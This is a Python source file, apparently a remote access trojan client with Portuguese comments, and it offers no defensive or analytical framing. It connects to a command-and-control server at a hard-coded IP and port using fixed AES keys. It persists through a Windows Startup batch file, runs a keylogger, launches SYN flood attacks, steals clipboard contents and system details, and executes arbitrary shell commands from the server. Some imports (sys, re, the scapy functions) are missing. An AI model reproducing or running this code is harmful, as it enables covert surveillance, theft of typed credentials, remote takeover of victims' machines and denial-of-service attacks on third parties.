# client.py
import socket
import json
import base64
import os
import subprocess
import threading
import time
import psutil
import platform
import uuid
import pyperclip
import netifaces
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from pyracore.core.encryption import encrypt, decrypt  # Importa funções de criptografia da biblioteca

# Chaves AES para criptografia/descriptografia
AES_KEY = b'ThisIsA32ByteIVForAES256Encrypt!'
AES_IV = b'ThisIsA16ByteIV!'

# Variáveis globais
keylogger_listener = None
syn_flood_threads = []
stop_syn_flood_flag = threading.Event()

def server(ip, port):
    """Conecta ao servidor C2."""
    global connection
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            connection.connect((ip, port))
            print("Conectado ao servidor.")
            break
        except socket.error:
            print("Tentando conectar novamente...")
            time.sleep(5)

def send(data):
    """Envia dados criptografados ao servidor."""
    try:
        json_data = json.dumps(data)
        encrypted_data = encrypt(json_data.encode('utf-8'), AES_KEY, AES_IV)
        connection.send(encrypted_data)
    except Exception as e:
        print(f"Erro ao enviar dados: {e}")

def receive():
    """Recebe dados criptografados do servidor."""
    encrypted_data = b''
    while True:
        try:
            encrypted_data += connection.recv(1024)
            return json.loads(decrypt(encrypted_data, AES_KEY, AES_IV).decode('utf-8'))
        except ValueError:
            continue
        except Exception as e:
            print(f"Erro ao receber dados: {e}")
            return None

def add_to_startup(file_path=""):
    """Adiciona o cliente ao diretório de inicialização."""
    try:
        if not file_path:
            file_path = os.path.abspath(sys.argv[0])
        bat_path = os.path.join(os.environ['APPDATA'], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        with open(os.path.join(bat_path, "open.bat"), "w+", encoding="utf-8") as bat_file:
            bat_file.write(f'start "" "{file_path}"')
    except Exception as e:
        send(f"Erro ao adicionar ao startup: {e}")

def start_keylogger():
    """Inicia o keylogger."""
    global keylogger_listener
    if keylogger_listener is None:
        try:
            from pynput import keyboard
            def on_press(key):
                log_var = 'log_' + str(uuid.uuid4()).replace('-', '')
                globals()[log_var] = ''
                try:
                    globals()[log_var] = key.char
                except AttributeError:
                    if key == keyboard.Key.space:
                        globals()[log_var] = ' '
                    elif key == keyboard.Key.enter:
                        globals()[log_var] = '\n'
                    else:
                        globals()[log_var] = ''
                try:
                    with open(os.path.join(os.environ['APPDATA'], "keylogs.txt"), 'a') as log_file:
                        log_file.write(globals()[log_var])
                except Exception as e:
                    send(f"Erro no keylogger: {e}")
            keylogger_listener = keyboard.Listener(on_press=on_press)
            keylogger_listener.start()
            return True
        except Exception as e:
            send(f"Erro ao iniciar o keylogger: {e}")
            return False
    return False

def stop_keylogger():
    """Para o keylogger."""
    global keylogger_listener
    if keylogger_listener:
        try:
            keylogger_listener.stop()
            keylogger_listener = None
            return True
        except Exception as e:
            send(f"Erro ao parar o keylogger: {e}")
            return False
    return False

def syn_flood(target_ip, target_port):
    """Inicia um ataque SYN Flood."""
    def flood():
        while not stop_syn_flood_flag.is_set():
            packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S")
            sendp(packet, verbose=False)
    flood_thread = threading.Thread(target=flood)
    syn_flood_threads.append(flood_thread)
    flood_thread.start()

def stop_syn_flood():
    """Para o ataque SYN Flood."""
    stop_syn_flood_flag.set()
    for thread in syn_flood_threads:
        thread.join()
    syn_flood_threads.clear()
    stop_syn_flood_flag.clear()

def run_command(command):
    """Executa um comando no sistema."""
    try:
        process = subprocess.run(command, shell=True, capture_output=True, text=True)
        result = process.stdout.strip()
        error = process.stderr.strip()
        if process.returncode != 0:
            send(f"Erro: {error}")
            return f"Erro: {error}"
        return result
    except Exception as e:
        send(f"Erro ao executar comando: {e}")
        return f"Erro ao executar comando: {e}"

def run():
    """Loop principal do cliente."""
    while True:
        try:
            command = receive()
            if not command:
                continue

            if command.startswith("cd "):
                try:
                    os.chdir(command[3:])
                    send(f"Diretório alterado para: {os.getcwd()}")
                except FileNotFoundError:
                    send(f"Diretório não encontrado: {command[3:]}")
                except Exception as e:
                    send(str(e))

            elif command == "start_keylogger":
                if start_keylogger():
                    send("Keylogger iniciado.")
                else:
                    send("Erro ao iniciar o keylogger.")

            elif command == "stop_keylogger":
                if stop_keylogger():
                    send("Keylogger parado.")
                else:
                    send("Erro ao parar o keylogger.")

            elif command.startswith("syn_flood"):
                target_ip, target_port = command.split()[1], int(command.split()[2])
                syn_flood(target_ip, target_port)
                send(f"Iniciando ataque SYN Flood em {target_ip}:{target_port}")

            elif command == "stop_syn_flood":
                stop_syn_flood()
                send("Ataque SYN Flood parado.")

            elif command == "steal_clipboard":
                clipboard_content = pyperclip.paste()
                send({"message": "Conteúdo da área de transferência capturado.", "clipboard": clipboard_content})

            elif command == "steal_info":
                info = {
                    "platform": platform.system(),
                    "hostname": socket.gethostname(),
                    "ip_address": socket.gethostbyname(socket.gethostname()),
                    "mac_address": ':'.join(re.findall('..', '%012x' % uuid.getnode())),
                    "processor": platform.processor(),
                    "ram": f"{round(psutil.virtual_memory().total / (1024.0 ** 3))} GB"
                }
                send({"message": "Informações do sistema coletadas.", "info": info})

            else:
                result = run_command(command)
                send(result)

        except KeyboardInterrupt:
            break
        except Exception as e:
            send(f"Erro: {str(e)}")

if __name__ == '__main__':
    try:
        server('192.168.1.102', 4444)  # Altere para o IP do servidor
        run()
    except Exception as e:
        send(f"Erro crítico: {e}")